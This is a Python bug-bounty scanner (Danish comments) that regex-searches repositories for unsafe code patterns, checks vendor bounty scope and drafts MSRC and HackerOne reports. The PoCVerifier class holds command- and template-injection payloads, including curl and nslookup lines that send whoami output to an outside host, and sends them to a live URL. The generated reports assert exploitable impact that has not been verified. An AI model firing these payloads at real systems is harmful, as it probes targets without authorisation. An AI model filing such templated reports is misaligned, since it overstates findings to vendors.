#!/usr/bin/env python3
"""
K4W Security — Vulnerability Validator v2.0
Automatisk triage + PoC verifikation + scope-check + async scanning.

Brug: python3 vuln_validator.py --type jinja2 --target /tmp/repo
      python3 vuln_validator.py --type rce --target /tmp/repo --async-workers 10
      python3 vuln_validator.py --type all --target /tmp/repo --scope-check msrc
      python3 vuln_validator.py --type all --target /tmp/repo --report --msrc-format
"""
import os
import re
import json
import sys
import time
import asyncio
import subprocess
import logging
import logging.handlers
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ============================================================
# LOG ROTATION — beskytter diskplads under async hunts
# ============================================================
LOG_DIR = Path.home() / "02_grok_engine" / "validator_logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / "validator.log"

# Rotate: max 5MB per fil, behold 3 backups
handler = logging.handlers.RotatingFileHandler(
    LOG_FILE, maxBytes=5*1024*1024, backupCount=3
)
handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.INFO)
log = logging.getLogger(__name__)

# ============================================================
# BOUNTY PRIORITY MATRIX — Send/Ikke Send tjekliste
# ============================================================
SEND_CRITERIA = {
    "reproducerbarhed": "Kan PoC køres i < 3 trin af tredjepart?",
    "tenant_boundary": "Påvirker det adgang til andres data/ressourcer?",
    "auth_identity": "Omgår det MFA, tokens eller roller?",
    "exploit_sti": "Er stien direkte (ikke chained over 10 events)?",
    "payout": "Er det top-tier bounty (RCE, IDOR, Auth Bypass)?",
}

def check_send_worthy(findings: dict) -> tuple:
    """Tjek om et fund er send-værdigt. Returnerer (score, should_send)."""
    score = 0
    for key, question in SEND_CRITERIA.items():
        if findings.get(key, False):
            score += 1
    return score, score >= 3  # Mindst 3 af 5 = SEND

# ============================================================
# RCE PoC VERIFICATION (Harmløse metoder)
# ============================================================
class PoCVerifier:
    """Verificer RCE og template injection med harmløse metoder."""

    # Sleep-test payloads
    SLEEP_PAYLOADS = [
        ("bash_sleep", "; sleep 10 #"),
        ("bash_dollar", "$(sleep 10)"),
        ("bash_backtick", "`sleep 10`"),
        ("cmd_sleep", "& timeout 10 &"),
    ]

    # DNS OOB payloads (requires collaborator/own DNS)
    DNS_OOB_PAYLOADS = [
        ("bash_nslookup", "; nslookup $(whoami).{dns_server} #"),
        ("bash_curl", "$(curl -s https://{webhook}/log?user=$(whoami))"),
    ]

    # Echo/reflection payloads
    ECHO_PAYLOADS = [
        ("bash_echo", "; echo VULN_CONFIRMED_$(whoami) #"),
        ("bash_hostname", "$(echo RCE_$(hostname)_$(date +%s))"),
    ]

    # Template injection payloads
    TEMPLATE_PAYLOADS = [
        ("jinja2_math", "{{ 7 * 7 }}", "49"),
        ("jinja2_string", "{{ 7 * '7' }}", "7777777"),
        ("jinja2_config", "{{ config.items() }}", None),  # any response = confirm
        ("jinja2_mro", "{{ self.__class__.__mro__ }}", None),
        ("erb_math", "<%= 7 * 7 %>", "49"),
        ("mako_math", "${7 * 7}", "49"),
    ]

    @staticmethod
    def verify_sleep(url: str, timeout_normal: float = 5.0) -> dict:
        """Sleep-test: hvis respons tager ~10s mere end normal = RCE bekræftet."""
        import requests
        try:
            # Mål normal responstid
            start = time.time()
            requests.get(url, timeout=timeout_normal)
            normal_time = time.time() - start

            # Send sleep payload
            for name, payload in PoCVerifier.SLEEP_PAYLOADS:
                start = time.time()
                try:
                    requests.get(url, params={"input": payload}, timeout=20)
                except requests.exceptions.ReadTimeout:
                    pass
                elapsed = time.time() - start

                if elapsed >= normal_time + 8:  # 10s sleep ± 2s tolerance
                    return {
                        "confirmed": True,
                        "method": f"sleep_test:{name}",
                        "evidence": f"Response delayed {elapsed:.1f}s (normal: {normal_time:.1f}s)",
                        "payload": payload,
                    }

            return {"confirmed": False, "method": "sleep_test", "evidence": "No timing difference detected"}
        except Exception as e:
            return {"confirmed": False, "method": "sleep_test", "evidence": f"Error: {e}"}

    @staticmethod
    def verify_template_injection(url: str, param: str = "input") -> dict:
        """Template injection test: {{ 7*7 }} = 49 bekræftet."""
        import requests
        for name, payload, expected in PoCVerifier.TEMPLATE_PAYLOADS:
            try:
                resp = requests.post(url, data={param: payload}, timeout=10)
                if expected and expected in resp.text:
                    return {
                        "confirmed": True,
                        "method": f"template_injection:{name}",
                        "evidence": f"Expected '{expected}' found in response",
                        "payload": payload,
                        "response_snippet": resp.text[:200],
                    }
                elif expected is None and payload.strip("{{ }}") in resp.text:
                    return {
                        "confirmed": True,
                        "method": f"template_injection:{name}",
                        "evidence": "Template expression evaluated in response",
                        "payload": payload,
                        "response_snippet": resp.text[:200],
                    }
            except Exception:
                continue
        return {"confirmed": False, "method": "template_injection", "evidence": "No template evaluation detected"}

# ============================================================
# JINJA2 XSS VALIDATOR
# ============================================================
JINJA2_PATTERNS = {
    "unsafe_env": {
        "pattern": r"jinja2\.Environment\(\s*\)",
        "fix": "jinja2.Environment(autoescape=True)",
        "severity": "HIGH",
        "cwe": "CWE-79",
        "class": "XSS",
    },
    "unsafe_env_noautoescape": {
        "pattern": r"jinja2\.Environment\(\s*autoescape\s*=\s*False",
        "fix": "jinja2.Environment(autoescape=True)",
        "severity": "HIGH",
        "cwe": "CWE-79",
        "class": "XSS",
    },
    "unescaped_variable": {
        "pattern": r"\{\{\s*(user_input|user_input|content|data|message|query|input|response|output|model_response)\s*\}\}",
        "fix": "Brug {{var|e}} eller autoescape=True",
        "severity": "MEDIUM",
        "cwe": "CWE-79",
        "class": "XSS",
    },
    "no_select_autoescape": {
        "pattern": r"jinja2\.Environment\((?!.*select_autoescape)",
        "fix": "jinja2.Environment(autoescape=jinja2.select_autoescape())",
        "severity": "LOW",
        "cwe": "CWE-79",
        "class": "XSS",
    },
}

# ============================================================
# RCE VALIDATOR (pickle, eval, yaml, torch.load)
# ============================================================
RCE_PATTERNS = {
    "torch_load": {
        "pattern": r"torch\.load\s*\(",
        "fix": "torch.load(..., weights_only=True) eller safetensors",
        "severity": "CRITICAL",
        "cwe": "CWE-502",
        "class": "RCE",
    },
    "pickle_load": {
        "pattern": r"pickle\.loads?\s*\(",
        "fix": "Brug json, msgpack, eller safetensors",
        "severity": "CRITICAL",
        "cwe": "CWE-502",
        "class": "RCE",
    },
    "yaml_unsafe_load": {
        "pattern": r"yaml\.load\s*\((?!.*Loader)",
        "fix": "yaml.load(..., Loader=yaml.SafeLoader)",
        "severity": "HIGH",
        "cwe": "CWE-502",
        "class": "RCE",
    },
    "eval_usage": {
        "pattern": r"\beval\s*\(",
        "fix": "Brug ast.literal_eval() eller whitelist",
        "severity": "HIGH",
        "cwe": "CWE-94",
        "class": "RCE",
    },
    "exec_usage": {
        "pattern": r"\bexec\s*\(",
        "fix": "Fjern eller brug sandbox",
        "severity": "HIGH",
        "cwe": "CWE-94",
        "class": "RCE",
    },
    "subprocess_shell": {
        "pattern": r"subprocess\.(call|run|Popen)\s*\([^)]*shell\s*=\s*True",
        "fix": "Brug shell=False og list args",
        "severity": "HIGH",
        "cwe": "CWE-78",
        "class": "RCE",
    },
    "os_system": {
        "pattern": r"os\.(system|popen)\s*\(",
        "fix": "Brug subprocess med shell=False",
        "severity": "HIGH",
        "cwe": "CWE-78",
        "class": "RCE",
    },
}

# ============================================================
# GITHUB ACTIONS INJECTION PATTERNS (NEW in v2)
# ============================================================
GHA_PATTERNS = {
    "unquoted_env_var": {
        "pattern": r"\$\{?\{?\s*(github\.event\.(comment\.body|pull_request\.(title|body)|issue\.(title|body)|push\.head\.commit\.message))\s*\}?\}?",
        "fix": "Pass via env: key in workflow step (avoids shell expansion)",
        "severity": "HIGH",
        "cwe": "CWE-78",
        "class": "Command Injection",
    },
    "unquoted_shell_var": {
        "pattern": r"(?<!['\"])\$\{?[A-Z_]+[A-Z_0-9]*\}?(?![\"'])",
        "fix": "Always quote: \"${VAR}\" or use env: context",
        "severity": "MEDIUM",
        "cwe": "CWE-78",
        "class": "Command Injection",
    },
}

# ============================================================
# SCOPE CHECK — Auto scope verification
# ============================================================
SCOPE_DATABASE = {
    "microsoft": {
        "program": "MSRC",
        "url": "https://www.microsoft.com/en-us/msrc/bounty",
        "in_scope": [
            "azure", "entra", "graph", "teams", "copilot", "azure ai",
            "vscode", "deepspeed", "semantic kernel", "botbuilder",
            "power toys", "qlib", "taskweaver", "autogen",
            "adaptive cards", "azure sdk", "azure ai foundry",
        ],
        "out_of_scope": ["social engineering", "physical attacks", "dos"],
        "submission": "secure@microsoft.com",
    },
    "google": {
        "program": "Google VRP",
        "url": "https://bughunters.google.com",
        "in_scope": [
            "google.com", "youtube", "android", "chrome", "cloud",
            "tensorflow", "angular", "flutter", "oss-vultest",
        ],
        "out_of_scope": ["google cloud platform dos", "social"],
        "submission": "https://bughunters.google.com/report",
    },
    "github": {
        "program": "GitHub VRP",
        "url": "https://bounty.github.com",
        "in_scope": [
            "github actions", "github api", "github pages",
            "github codespaces", "github copilot",
        ],
        "out_of_scope": ["third-party apps", "repos hosted on github"],
        "submission": "https://hackerone.com/github",
    },
    "nvidia": {
        "program": "NVIDIA PSIRT",
        "url": "https://www.nvidia.com/en-us/security/report-vulnerability/",
        "in_scope": ["nim api", "cuda", "tensorrt", "ngc", "nvidia ai"],
        "out_of_scope": ["physical access", "social engineering"],
        "submission": "psirt@nvidia.com",
    },
    "huggingface": {
        "program": "HuggingFace Security",
        "url": "https://huggingface.co/security",
        "in_scope": ["spaces", "model hub", "inference api", "transformers"],
        "out_of_scope": ["user content", "third-party models"],
        "submission": "security@huggingface.co",
    },
    "gitlab": {
        "program": "GitLab HackerOne",
        "url": "https://hackerone.com/gitlab",
        "in_scope": ["gitlab.com", "gitlab ai", "gitlab runner", "gitlab ci"],
        "out_of_scope": ["third-party integrations"],
        "submission": "https://hackerone.com/gitlab",
    },
}

def check_scope(product: str, vendor: str = None) -> dict:
    """Check om et product er in-scope for et bounty program."""
    product_lower = product.lower()
    results = []

    for vendor_key, info in SCOPE_DATABASE.items():
        if vendor and vendor.lower() != vendor_key:
            continue
        for scope_item in info["in_scope"]:
            if scope_item in product_lower or product_lower in scope_item:
                results.append({
                    "vendor": vendor_key,
                    "program": info["program"],
                    "in_scope": True,
                    "scope_match": scope_item,
                    "url": info["url"],
                    "submission": info["submission"],
                })

    if not results:
        return {"in_scope": False, "vendors_checked": len(SCOPE_DATABASE), "matches": []}

    return {"in_scope": True, "matches": results}

# ============================================================
# CONTEXT AWARENESS — Mission log duplicate detection
# ============================================================
def load_mission_log(missions_dir: str = None) -> set:
    """Indlæs allerede verificerede fund fra mission-log for at undgå duplikater."""
    if missions_dir is None:
        # Default: ~/01_missions_og_rapporter/
        home = os.path.expanduser("~")
        missions_dir = os.path.join(home, "01_missions_og_rapporter")

    known_patterns = set()
    if not os.path.isdir(missions_dir):
        return known_patterns

    # Scan .md and .txt files for CWE + pattern signatures
    for root, dirs, files in os.walk(missions_dir):
        dirs[:] = [d for d in dirs if d not in {'.git', '__pycache__', 'msrc_reports'}]
        for f in files:
            if f.endswith(('.md', '.txt')):
                fp = os.path.join(root, f)
                try:
                    with open(fp, 'r', errors='ignore') as fh:
                        content = fh.read().lower()
                        # Extract CWE references
                        for m in re.finditer(r'cwe-(\d+)', content):
                            known_patterns.add(f"cwe-{m.group(1)}")
                        # Extract specific vuln types
                        for kw in ['torch.load', 'pickle.load', 'yaml.load', 'eval(',
                                   'jinja2', 'autoescape', 'shell injection', 'command injection',
                                   'cross-tenant', 'idor', 'token theft', 'mfa bypass']:
                            if kw in content:
                                known_patterns.add(kw)
                except Exception:
                    pass

    return known_patterns

def is_duplicate(finding: dict, known_patterns: set) -> bool:
    """Tjek om et fund allerede er kendt fra mission-log."""
    cwe = finding.get('cwe', '').lower()
    pattern_name = finding.get('pattern_name', '').lower()

    if cwe in known_patterns:
        return True
    for kw in known_patterns:
        if kw in pattern_name or kw in finding.get('code', '').lower():
            return True
    return False

# ============================================================
# ASYNC SCANNER
# ============================================================
def scan_file(filepath: str, patterns: dict, target_path: str) -> list:
    """Scan en enkelt fil for sårbarhedsmønstre."""
    results = []
    try:
        with open(filepath, 'r', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                for name, info in patterns.items():
                    if re.search(info['pattern'], line):
                        results.append({
                            "file": filepath.replace(target_path + "/", ""),
                            "line": line_num,
                            "code": line.strip()[:100],
                            "vuln_class": info['class'],
                            "severity": info['severity'],
                            "cwe": info['cwe'],
                            "pattern_name": name,
                            "fix": info['fix'],
                        })
    except Exception:
        pass
    return results

def scan_repo(target_path: str, vuln_type: str, async_workers: int = 1) -> list:
    """Scan repo for vulnerability patterns. Supports async via ThreadPoolExecutor."""
    results = []
    patterns = {
        "jinja2": JINJA2_PATTERNS,
        "rce": RCE_PATTERNS,
        "gha": GHA_PATTERNS,
    }

    if vuln_type == "all":
        scan_patterns = {}
        for p in patterns.values():
            scan_patterns.update(p)
    else:
        scan_patterns = patterns.get(vuln_type, {})

    py_files = []
    for root, dirs, files in os.walk(target_path):
        dirs[:] = [d for d in dirs if d not in {'.git', '__pycache__', 'node_modules', '.venv', 'venv'}]
        for f in files:
            if f.endswith(('.py', '.html', '.txt', '.yaml', '.yml')):
                py_files.append(os.path.join(root, f))

    if async_workers > 1:
        # Async/parallel scanning
        with ThreadPoolExecutor(max_workers=async_workers) as pool:
            futures = {
                pool.submit(scan_file, fp, scan_patterns, target_path): fp
                for fp in py_files
            }
            for future in as_completed(futures):
                results.extend(future.result())
    else:
        # Sequential (original behavior)
        for fp in py_files:
            results.extend(scan_file(fp, scan_patterns, target_path))

    return results

# ============================================================
# MSRC FORMAT GENERATOR — Copy-paste klar
# ============================================================
def generate_msrc_report(result: dict, product: str, repo_url: str, scope_info: dict = None) -> str:
    """Generer MSRC-venlig rapport i copy-paste format med scope-info."""
    severity = result['severity']
    vuln_class = result['vuln_class']
    cwe = result['cwe']
    scope_note = ""

    if scope_info and scope_info.get('in_scope'):
        match = scope_info['matches'][0]
        scope_note = f"\nSCOPE VERIFICATION: In-scope for {match['program']} ({match['vendor']})\nSubmission: {match['submission']}"

    return f"""EMNE: [{cwe}] {product} — {vuln_class} via {result['pattern_name']} (CVSS pending)

VULNERABILITY TYPE: {vuln_class}
SEVERITY: {severity}
CWE: {cwe}
PRODUCT: {product}
REPO: {repo_url}

══════════════════════════════════════════════

SUMMARY:
{vuln_class} in {result['file']} line {result['line']}. The code uses {result['code']}
which enables {vuln_class} when processing untrusted input.

IMPACT:
An attacker can execute {vuln_class.lower()} via user-controlled data passing through
this code path. This affects any application using this code with external input.

REPRODUCTION:
1. Identify entry point: {result['file']}:{result['line']}
2. Code: {result['code']}
3. Inject payload via user-controlled input
4. Observe {vuln_class} execution

EVIDENCE:
File: {result['file']}
Line: {result['line']}
Code: {result['code']}
CWE: {cwe}{scope_note}

MITIGATION:
Replace: {result['code']}
With: {result['fix']}

══════════════════════════════════════════════
Reporter: admin_user (k4w1992@gmail.com)
GitHub: k4w1992-lgtm
Date: {datetime.now().strftime('%Y-%m-%d')}
"""

def generate_hackerone_report(result: dict, product: str, repo_url: str) -> str:
    """HackerOne format (more concise)."""
    return f"""Title: [{result['cwe']}] {product} — {result['vuln_class']} in {result['file']}

Severity: {result['severity']}
CWE: {result['cwe']}

Description:
{result['vuln_class']} vulnerability in {result['file']}:{result['line']}.
Vulnerable code: {result['code']}

Steps to Reproduce:
1. Navigate to code path: {result['file']}:{result['line']}
2. Provide malicious input through user-controlled data
3. Observe {result['vuln_class']} execution

Impact:
Remote code execution / data exfiltration via {result['pattern_name']}.

Mitigation:
{result['fix']}

Supporting Material:
Repo: {repo_url}
"""

# ============================================================
# CLI
# ============================================================
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="K4W Vuln Validator v2.0")
    parser.add_argument("--type", choices=["jinja2", "rce", "gha", "all"], required=True,
                        help="Vulnerability type to scan for")
    parser.add_argument("--target", required=True, help="Repo path to scan")
    parser.add_argument("--product", default="Unknown", help="Product name for report")
    parser.add_argument("--vendor", default=None, help="Vendor name (microsoft, google, github, nvidia, huggingface, gitlab)")
    parser.add_argument("--repo-url", default="https://github.com/...", help="Repo URL")
    parser.add_argument("--report", action="store_true", help="Generate reports")
    parser.add_argument("--msrc-format", action="store_true", help="MSRC copy-paste format")
    parser.add_argument("--hackerone-format", action="store_true", help="HackerOne format")
    parser.add_argument("--min-severity", choices=["CRITICAL", "HIGH", "MEDIUM", "LOW"], default="MEDIUM")
    parser.add_argument("--async-workers", type=int, default=1, help="Parallel scan workers (default 1, try 10-20)")
    parser.add_argument("--scope-check", action="store_true", help="Auto-check if product is in bounty scope")
    parser.add_argument("--skip-duplicates", action="store_true", help="Skip findings already in mission log")
    parser.add_argument("--missions-dir", default=None, help="Path to missions directory for context")
    parser.add_argument("--poc-url", default=None, help="URL for live PoC verification (sleep/template test)")
    args = parser.parse_args()

    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    min_sev = severity_order[args.min_severity]

    # Load context (mission log) for duplicate detection
    known_patterns = set()
    if args.skip_duplicates:
        known_patterns = load_mission_log(args.missions_dir)
        print(f"Context: Loaded {len(known_patterns)} known patterns from mission log")

    # Scan
    results = scan_repo(args.target, args.type, args.async_workers)

    # Filter by severity
    results = [r for r in results if severity_order[r['severity']] <= min_sev]

    # Deduplicate by file+pattern
    seen = set()
    unique = []
    for r in results:
        key = f"{r['file']}:{r['pattern_name']}"
        if key not in seen:
            seen.add(key)
            unique.append(r)

    # Skip duplicates from mission log
    new_findings = []
    dup_count = 0
    if args.skip_duplicates and known_patterns:
        for r in unique:
            if is_duplicate(r, known_patterns):
                dup_count += 1
            else:
                new_findings.append(r)
        unique = new_findings

    # Scope check
    scope_info = None
    if args.scope_check:
        scope_info = check_scope(args.product, args.vendor)

    # PoC verification (if URL provided)
    poc_results = []
    if args.poc_url:
        print(f"\nPoC Verification against: {args.poc_url}")
        poc = PoCVerifier()
        # Try template injection first (safer)
        ti_result = poc.verify_template_injection(args.poc_url)
        poc_results.append(ti_result)
        # Try sleep test
        sleep_result = poc.verify_sleep(args.poc_url)
        poc_results.append(sleep_result)

    # Output
    print(f"\n{'='*60}")
    print(f"K4W VULN VALIDATOR v2.0 — {args.type.upper()} SCAN")
    print(f"Target: {args.target}")
    print(f"Workers: {args.async_workers}")
    if args.skip_duplicates:
        print(f"Duplicates skipped: {dup_count}")
    print(f"{'='*60}")

    if not unique:
        print("\nNo new vulnerabilities found. Clean!")
        sys.exit(0)

    # Group by severity
    by_sev = {}
    for r in unique:
        by_sev.setdefault(r['severity'], []).append(r)

    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        hits = by_sev.get(sev, [])
        if not hits:
            continue
        print(f"\n--- {sev} ({len(hits)} findings) ---")
        for r in hits:
            # Check send-worthiness
            findings_map = {
                "reproducerbarhed": True,  # Source code vuln = reproducerbar
                "tenant_boundary": sev in ("CRITICAL", "HIGH"),
                "auth_identity": "auth" in r.get('pattern_name', '').lower(),
                "exploit_sti": True,  # Direct code path
                "payout": sev == "CRITICAL",
            }
            score, should_send = check_send_worthy(findings_map)
            send_flag = "SEND" if should_send else "BACKLOG"
            dup_flag = " (DUP)" if args.skip_duplicates and is_duplicate(r, known_patterns) else ""
            print(f"  [{send_flag}] [{r['cwe']}] {r['file']}:{r['line']}{dup_flag}")
            print(f"    Code: {r['code']}")
            print(f"    Fix:  {r['fix']}")

    # Scope check output
    if scope_info:
        print(f"\n{'='*60}")
        print("SCOPE CHECK RESULTS")
        if scope_info['in_scope']:
            for match in scope_info['matches']:
                print(f"  [IN-SCOPE] {match['program']} ({match['vendor']})")
                print(f"    Match: {match['scope_match']}")
                print(f"    Submit: {match['submission']}")
        else:
            print(f"  [NOT IN SCOPE] No matching bounty programs found")
            print(f"  Vendors checked: {scope_info['vendors_checked']}")

    # PoC verification output
    if poc_results:
        print(f"\n{'='*60}")
        print("PoC VERIFICATION RESULTS")
        for pr in poc_results:
            status = "CONFIRMED" if pr['confirmed'] else "NOT CONFIRMED"
            print(f"  [{status}] {pr['method']}")
            print(f"    Evidence: {pr['evidence']}")
            if pr.get('payload'):
                print(f"    Payload: {pr['payload']}")

    # Generate reports
    if args.report and unique:
        report_dir = os.path.join(args.target, "msrc_reports")
        os.makedirs(report_dir, exist_ok=True)
        for i, r in enumerate(unique):
            if severity_order[r['severity']] <= min_sev:
                if args.hackerone_format:
                    report = generate_hackerone_report(r, args.product, args.repo_url)
                    ext = "h1"
                elif args.msrc_format:
                    report = generate_msrc_report(r, args.product, args.repo_url, scope_info)
                    ext = "msrc"
                else:
                    report = generate_msrc_report(r, args.product, args.repo_url, scope_info)
                    ext = "txt"
                path = os.path.join(report_dir, f"report_{i+1}_{r['pattern_name']}.{ext}")
                with open(path, "w") as f:
                    f.write(report)
        print(f"\n{len(unique)} reports written to {report_dir}/")

    # Summary
    print(f"\n{'='*60}")
    sendable = sum(1 for r in unique if check_send_worthy({
        "reproducerbarhed": True,
        "tenant_boundary": r['severity'] in ("CRITICAL", "HIGH"),
        "auth_identity": "auth" in r.get('pattern_name', '').lower(),
        "exploit_sti": True,
        "payout": r['severity'] == "CRITICAL",
    })[1])
    print(f"Total: {len(unique)} unique findings")
    print(f"Send-worthy: {sendable} | Backlog: {len(unique) - sendable}")
    if dup_count:
        print(f"Duplicates skipped: {dup_count}")
    if scope_info and scope_info['in_scope']:
        print(f"Scope: IN-SCOPE ({scope_info['matches'][0]['program']})")